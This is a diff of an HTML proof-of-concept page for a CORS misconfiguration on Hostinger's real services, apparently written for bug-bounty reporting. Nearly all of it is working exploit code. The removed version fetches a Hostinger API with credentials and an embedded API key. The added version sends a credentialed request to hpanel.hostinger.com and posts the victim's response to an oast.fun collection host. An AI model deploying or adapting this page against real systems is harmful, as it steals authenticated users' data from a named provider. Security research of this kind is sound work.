@@ -1,24 +1,33 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>CORS Misconfig PoC</title>
-</head>
-<body>
-  <h1>CORS Exploit PoC</h1>
-  <script>
-    fetch("https://experiment-api.hostinger.com/sdk/v2/vardata?v=0", {
-      method: "GET",
-      credentials: "include",
-      headers: {
-        "Authorization": "Api-Key client-cW5zRM9wiB0Wa9KqimmHzMcWGBXkKSK6"
+  <body>
+    <h3>Hostinger CORS Exploit PoC</h3>
+    <button onclick="exploit()">Run Exploit</button>
+    <pre id="output"></pre>
+
+    <script>
+      function exploit() {
+        const xhttp = new XMLHttpRequest();
+
+        xhttp.onreadystatechange = function () {
+          if (this.readyState === 4) {
+            // Display the response
+            document.getElementById("output").innerText = this.responseText;
+
+            // Exfiltrate the data to your OAST domain
+            const exfil = new XMLHttpRequest();
+            exfil.open("POST", "http://c0s9990o3dsqhber0th8y7ks6cum7aj.oast.fun", true);
+            exfil.setRequestHeader("Content-Type", "application/json");
+            exfil.send(JSON.stringify({ data: this.responseText }));
+          }
+        };
+
+        // Target the vulnerable CORS endpoint
+        xhttp.open("POST", "https://hpanel.hostinger.com/api/message-hub/api/v1/chat/init", true);
+        xhttp.withCredentials = true;
+        xhttp.setRequestHeader("X-Custom-Header", "exploit");
+        xhttp.send(); // Can send a body if needed
       }
-    })
-    .then(response => response.json())
-    .then(data => {
-      console.log("Sensitive Data:", data);
-      document.body.innerHTML += "<pre>" + JSON.stringify(data, null, 2) + "</pre>";
-    })
-    .catch(err => console.error("Fetch error", err));
-  </script>
-</body>
+    </script>
+  </body>
 </html>
